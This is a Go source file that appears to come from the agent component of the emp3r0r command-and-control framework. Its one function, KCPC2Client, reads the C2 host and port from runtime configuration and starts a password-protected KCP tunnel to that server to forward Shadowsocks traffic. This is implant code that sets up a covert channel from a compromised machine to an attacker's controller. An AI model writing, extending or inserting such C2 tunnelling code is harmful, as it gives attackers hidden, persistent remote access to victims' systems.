package agent

import (
	"context"
	"fmt"
	"log"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
)

// Connect to C2 KCP server, forward Shadowsocks traffic
func KCPC2Client() {
	if !RuntimeConfig.UseKCP {
		return
	}
	// this context ends when agent exits
	ctx, cancel := context.WithCancel(context.Background())
	kcp_server_addr := fmt.Sprintf("%s:%s", RuntimeConfig.CCHost, RuntimeConfig.KCPServerPort)
	err := tun.KCPTunClient(kcp_server_addr, RuntimeConfig.KCPClientPort,
		RuntimeConfig.Password, emp3r0r_data.MagicString, ctx, cancel)
	if err != nil {
		log.Printf("KCPTUN failed to start: %v", err)
	}
}
